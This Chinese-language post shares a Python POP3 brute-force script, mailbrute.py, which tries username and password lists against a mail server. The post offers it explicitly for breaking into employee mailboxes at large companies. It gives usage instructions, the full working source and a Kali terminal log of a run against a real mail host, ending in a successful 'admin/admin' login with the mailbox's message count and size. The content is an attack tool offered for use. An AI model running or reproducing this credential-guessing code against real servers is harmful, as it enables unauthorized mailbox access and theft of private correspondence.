脚本亮点：password字典支持：{username}123 这种形式。可以自定义如果用户名是test则密码为test123
成功的帐号密码实时显示，不必等到结束后才能看到，而且会把结果保存在同目录的mailsuccess.txt中。
在渗透一些大企业的员工邮箱中可以用到。
用法：mailbrute.py <userlist> <wordlist> <port> <server> <@example.com>
         mailbrute.py user.txt pass.txt 110 pop.qq.com @xxx.com
         --user.txt 用户名字典
         --pass.txt 密码字典
         --110 端口（这里可以是110或者995）
         --pop.qq.com 邮件server
         --@xxx.com 邮箱后缀
         


import poplib
import sys
import time
 
if len(sys.argv) !=6:
	print "\tUsage: ./popbrute.py <userlist> <wordlist> <port> <server> <@example.com> \n"
	sys.exit(1)
success1 = open('mailsuccess1.txt','w')
user = sys.argv[1]
words = sys.argv[2]
port = sys.argv[3]
server = sys.argv[4]
name = sys.argv[5]

userlist = open(user,'r').read().split("\n")
wordslist = open(words,'r').read().split("\n")
success = []
 
for mail_user in userlist:
	agent_user = mail_user
	mail_user = agent_user + name
	for mail_pass in wordslist:
		if "{username}" in mail_pass:
			mail_pass = mail_pass.replace("{username}",agent_user)
		try:
			print "+"*12
			print "[*]"+mail_user +":" +mail_pass
			if int(port)==110:
				popserver = poplib.POP3(server,110)         
			else: 
				popserver = poplib.POP3_SSL(server,995) 
			popserver.user(mail_user) 
			auth = popserver.pass_(mail_pass) 
			if auth.split(' ')[0] == "+OK" or auth =="+OK": 
				res = (mail_user,mail_pass,popserver.stat()[0],popserver.stat()[1]) 
				success.append(res)
				print success
				print>>success1,success
				popserver.quit() 
				break
			else : 
				popserver.quit() 
				continue
		except:
				pass
				time.sleep(1)
 
 
print "\n+++++++++++++++++++++++++++++++++++++"
print "+++++++++++++++++++++++++++++++++++++"
 
if len(success)==0:
	print "[-]-_-|| no weakpass "
if len(success) >=1:
	print "[+] have weakpass :"
	for res in success: 
		print "\n[+] Login successful:",res[0], res[1] 
		print "\t[+] Mail:",res[2],"emails"
		print "\t[+] Size:",res[3],"bytes\n"
print "\n[-] Done"









root@kali:~/Desktop# python mail2.py mail.txt mailpass.txt 110 pop.exmail.qq.com @chinabaiker.com
++++++++++++
[*]aaaa@chinabaiker.com:aaaaa
++++++++++++
[*]aaaa@chinabaiker.com:ccccc
++++++++++++
[*]aaaa@chinabaiker.com:admin
++++++++++++
[*]aaaa@chinabaiker.com:ddddd
++++++++++++
[*]ssss@chinabaiker.com:aaaaa
++++++++++++
[*]ssss@chinabaiker.com:ccccc
++++++++++++
[*]ssss@chinabaiker.com:admin
++++++++++++
[*]ssss@chinabaiker.com:ddddd
++++++++++++
[*]admin@chinabaiker.com:aaaaa
++++++++++++
[*]admin@chinabaiker.com:ccccc
++++++++++++
[*]admin@chinabaiker.com:admin
[('admin@chinabaiker.com', 'admin', 166, 10353771)]
++++++++++++
[*]ddddd@chinabaiker.com:aaaaa
++++++++++++
[*]ddddd@chinabaiker.com:ccccc
++++++++++++
[*]ddddd@chinabaiker.com:admin
++++++++++++
[*]ddddd@chinabaiker.com:ddddd

+++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++
[+] have weakpass :

[+] Login successful: admin@chinabaiker.com admin
	[+] Mail: 166 emails
	[+] Size: 10353771 bytes


[-] Done
